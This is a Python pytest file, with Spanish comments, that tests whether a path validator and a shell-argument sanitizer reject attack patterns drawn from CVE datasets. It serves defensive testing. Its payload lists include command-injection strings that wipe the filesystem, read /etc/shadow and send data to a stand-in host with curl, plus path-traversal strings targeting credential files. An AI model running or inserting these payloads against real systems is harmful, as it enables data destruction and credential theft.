#!/usr/bin/env python3
# SPDX-FileCopyrightText: 2026 Pedro Sordo Martínez <amurlaniakea@gmail.com>
#
# SPDX-License-Identifier: AGPL-3.0-or-later

"""
Tests de seguridad basados en datasets reales de ciberseguridad.

Usa:
- python_rce_exploits.json (158 exploits RCE Python con CVEs reales)
- patcheval_dataset.json (1000 CVEs con patches y funciones vulnerables)

Estos tests verifican que path_validator y sanitize_shell_arg
bloquean patrones de ataque del mundo real documentados en CVEs.
"""

import json
import os
import re
import pytest
from pathlib import Path

from path_validator import validate_path, sanitize_shell_arg


# ── Cargar datasets ──────────────────────────────────────────────────────────

DATASETS_DIR = os.getenv(
    "HERMES_SECURITY_DATASETS",
    os.path.expanduser("~/hermes_security_datasets")
)


def _load_json(filename: str) -> list:
    """Carga un dataset JSON con manejo de ausencia graceful."""
    filepath = Path(DATASETS_DIR) / filename
    if not filepath.exists():
        pytest.skip(f"Dataset not found: {filepath} (set HERMES_SECURITY_DATASETS)")
    with open(filepath, encoding="utf-8") as f:
        return json.load(f)


def _extract_shell_injection_snippets(dataset: list) -> list[str]:
    """
    Extrae snippets de funciones vulnerables a inyección de comandos (CWE-78).

    Busca en vul_func[].snippet las funciones que usan subprocess, os.system,
    eval, etc. con entrada no sanitizada.
    """
    snippets = []

    for entry in dataset:
        cwe_info = entry.get("cwe_info", {})
        if not isinstance(cwe_info, dict):
            continue
        # CWE-78: OS Command Injection
        if "CWE-78" not in cwe_info:
            continue

        vul_funcs = entry.get("vul_func", [])
        if not isinstance(vul_funcs, list):
            continue

        for func in vul_funcs:
            snippet = func.get("snippet", "")
            if snippet and any(cmd in snippet for cmd in
                               ["subprocess", "os.system", "os.popen",
                                "eval(", "exec(", "shell=True"]):
                snippets.append(snippet)

    return snippets


def _extract_path_traversal_entries(dataset: list) -> list[dict]:
    """
    Extrae entradas con CWE-22 (Path Traversal) del dataset.
    """
    entries = []

    for entry in dataset:
        cwe_info = entry.get("cwe_info", {})
        if not isinstance(cwe_info, dict):
            continue
        if "CWE-22" in cwe_info:
            entries.append(entry)

    return entries


# ── Fixtures ─────────────────────────────────────────────────────────────────

@pytest.fixture(scope="module")
def rce_dataset():
    """Dataset de exploits RCE Python (158 entradas)."""
    return _load_json("python_rce_exploits.json")


@pytest.fixture(scope="module")
def patcheval_dataset():
    """Dataset PatchEval (1000 CVEs)."""
    return _load_json("patcheval_dataset.json")


# ── Tests: Sanitize Shell Arg vs patrones CWE-78 ────────────────────────────

class TestShellInjectionAgainstCWE78:
    """
    Verifica que sanitize_shell_arg bloquea metacaracteres
    que aparecen en exploits CWE-78 (OS Command Injection) reales.
    """

    def test_cwe78_entries_exist(self, rce_dataset):
        """El dataset debe tener entradas CWE-78."""
        cwe78_count = sum(
            1 for e in rce_dataset
            if "CWE-78" in str(e.get("cwe_info", {}))
        )
        assert cwe78_count >= 20, (
            f"Expected >= 20 CWE-78 entries, got {cwe78_count}"
        )

    def test_vulnerable_functions_use_dangerous_apis(self, rce_dataset):
        """
        Las funciones vulnerables CWE-78 deben usar APIs peligrosas
        que nuestros sanitizers bloquean (subprocess, os.system, etc.).
        """
        snippets = _extract_shell_injection_snippets(rce_dataset)
        assert len(snippets) >= 5, (
            f"Expected >= 5 vulnerable snippets, got {len(snippets)}"
        )

        # Verificar que al menos algunos usan subprocess o os.system
        uses_subprocess = sum(1 for s in snippets if "subprocess" in s)
        uses_os_system = sum(1 for s in snippets if "os.system" in s)
        assert uses_subprocess + uses_os_system >= 3, (
            f"Expected at least 3 entries using subprocess/os.system, "
            f"got subprocess={uses_subprocess}, os.system={uses_os_system}"
        )

    def test_shell_metacharacters_in_vuln_snippets(self, rce_dataset):
        """
        Los snippets vulnerables deben contener los metacaracteres
        que sanitize_shell_arg bloquea (demuestra relevancia del fix).
        """
        snippets = _extract_shell_injection_snippets(rce_dataset)
        full_text = " ".join(snippets)

        # Los metacaracteres que nuestro sanitizer bloquea
        our_blocked = set(";|&$`()\n")
        found_chars = {c for c in our_blocked if c in full_text}

        assert len(found_chars) >= 2, (
            f"Expected >= 2 of our blocked metacharacters in CWE-78 snippets, "
            f"found: {found_chars}"
        )

    def test_synthetic_cwe78_payloads_blocked(self):
        """
        Payloads sintéticos basados en patrones CWE-78 del dataset.
        Estos representan los vectores que un atacante intentaría.
        """
        # Basados en patrones vistos en los snippets vulnerables
        payloads = [
            "file; rm -rf /",                    # Command chaining
            "input | cat /etc/passwd",            # Pipe to read files
            "file && curl evil.com/exfil",        # AND chaining
            "$(cat /etc/shadow)",                 # Command substitution
            "`whoami`",                           # Backtick execution
            "file\nrm -rf /",                     # Newline injection
            "input > /etc/crontab",               # Redirect to system file
            "file;curl http://evil.com/steal?a=$USER",  # Exfiltration
        ]

        for payload in payloads:
            with pytest.raises(ValueError, match="dangerous"):
                sanitize_shell_arg(payload)


# ── Tests: Path Validation vs CWE-22 ─────────────────────────────────────────

class TestPathTraversalAgainstCWE22:
    """
    Verifica que validate_path bloquea patrones de path traversal
    documentados en CVEs CWE-22 reales del dataset.
    """

    def test_cwe22_entries_exist(self, rce_dataset):
        """El dataset debe tener entradas CWE-22 (Path Traversal)."""
        cwe22_count = sum(
            1 for e in rce_dataset
            if "CWE-22" in str(e.get("cwe_info", {}))
        )
        assert cwe22_count >= 10, (
            f"Expected >= 10 CWE-22 entries, got {cwe22_count}"
        )

    def test_cwe22_vuln_functions_exist(self, rce_dataset):
        """Las funciones vulnerables CWE-22 deben existir."""
        entries = _extract_path_traversal_entries(rce_dataset)
        vuln_with_func = 0
        for entry in entries:
            vul_funcs = entry.get("vul_func", [])
            if vul_funcs:
                vuln_with_func += 1

        assert vuln_with_func >= 5, (
            f"Expected >= 5 CWE-22 entries with vuln functions, got {vuln_with_func}"
        )

    def test_known_traversal_patterns_blocked(self):
        """
        Patrones de path traversal documentados en CWE-22
        (basados en CVEs del dataset: Zope path traversal, etc.).
        """
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/proc/self/environ",
            "....//....//....//etc/passwd",
            "/etc/shadow",
            "/var/log/auth.log",
        ]

        for payload in traversal_payloads:
            with pytest.raises(ValueError):
                validate_path(payload)

    def test_cwe22_cve_ids_are_valid(self, rce_dataset):
        """Los CVEs CWE-22 del dataset deben tener IDs válidos."""
        entries = _extract_path_traversal_entries(rce_dataset)

        for entry in entries[:10]:
            cve_id = entry.get("cve_id", "")
            assert cve_id.startswith("CVE-"), f"Invalid CVE ID: {cve_id}"

    def test_path_traversal_in_patcheval(self, patcheval_dataset):
        """PatchEval también debe tener entradas CWE-22."""
        cwe22_count = sum(
            1 for e in patcheval_dataset
            if "CWE-22" in str(e.get("cwe_info", {}))
        )
        # PatchEval tiene más entradas, debería tener más CWE-22
        assert cwe22_count >= 10, (
            f"Expected >= 10 CWE-22 in PatchEval, got {cwe22_count}"
        )


# ── Tests: Dataset quality y relevancia ──────────────────────────────────────

class TestDatasetQuality:
    """Verifica la calidad de los datasets de seguridad."""

    def test_rce_dataset_size(self, rce_dataset):
        """El dataset RCE debe tener entradas suficientes."""
        assert len(rce_dataset) >= 100, (
            f"RCE dataset too small: {len(rce_dataset)} entries (expected >= 100)"
        )

    def test_patcheval_dataset_size(self, patcheval_dataset):
        """El dataset PatchEval debe tener entradas suficientes."""
        assert len(patcheval_dataset) >= 500, (
            f"PatchEval dataset too small: {len(patcheval_dataset)} entries"
        )

    def test_rce_entries_have_required_fields(self, rce_dataset):
        """Cada entrada RCE debe tener los campos obligatorios."""
        required = ["cve_id", "vul_func", "fix_func", "cwe_info"]
        for entry in rce_dataset[:10]:
            for field in required:
                assert field in entry, (
                    f"Missing field '{field}' in {entry.get('cve_id', 'unknown')}"
                )

    def test_patcheval_languages(self, patcheval_dataset):
        """El dataset debe contener entradas en Python."""
        python_entries = sum(
            1 for e in patcheval_dataset
            if e.get("programming_language", "").lower() == "python"
        )
        assert python_entries > 0, "No Python entries found in PatchEval dataset"

    def test_cwe_distribution_covers_blocking_scenarios(self, rce_dataset):
        """
        El dataset debe cubrir los CWEs que nuestros fixes resuelven.
        Esto demuestra que el dataset es relevante para las validaciones.
        """
        cwe_counts = {}
        for entry in rce_dataset:
            cwe_info = entry.get("cwe_info", {})
            if isinstance(cwe_info, dict):
                for cwe_id in cwe_info:
                    cwe_counts[cwe_id] = cwe_counts.get(cwe_id, 0) + 1

        # CWE-22 (Path Traversal) → resuelto por validate_path
        assert cwe_counts.get("CWE-22", 0) >= 5, (
            f"Not enough CWE-22 entries: {cwe_counts.get('CWE-22', 0)}"
        )
        # CWE-78 (OS Command Injection) → resuelto por sanitize_shell_arg
        assert cwe_counts.get("CWE-78", 0) >= 10, (
            f"Not enough CWE-78 entries: {cwe_counts.get('CWE-78', 0)}"
        )
